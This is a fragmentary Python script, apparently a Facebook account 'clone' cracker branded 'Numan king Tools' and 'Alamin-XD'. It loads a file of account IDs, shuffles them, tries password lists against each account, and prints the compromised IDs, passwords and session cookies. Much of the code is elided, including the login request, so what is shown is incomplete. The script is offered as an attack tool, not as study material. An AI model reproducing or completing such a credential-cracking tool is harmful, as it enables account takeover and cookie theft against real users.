...
os.system('espeak -a 300 " Welcome,   to,  Numan,  king,  Tools"')
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/Nxt.txt  Etc...]')
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN NXT\n\x1b[1;97m [1] METHOD FILE CLONE ')
	os.system('espeak -a 300 " 1,  method,  FILE CLONE"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Alamin-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tutul-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Alamin🥲-Cp] {idf} • {pw}')     
				...
				#Alamin-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Nxt-Ok] {idf} • {pw}\n\033[0;93m[🧨]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
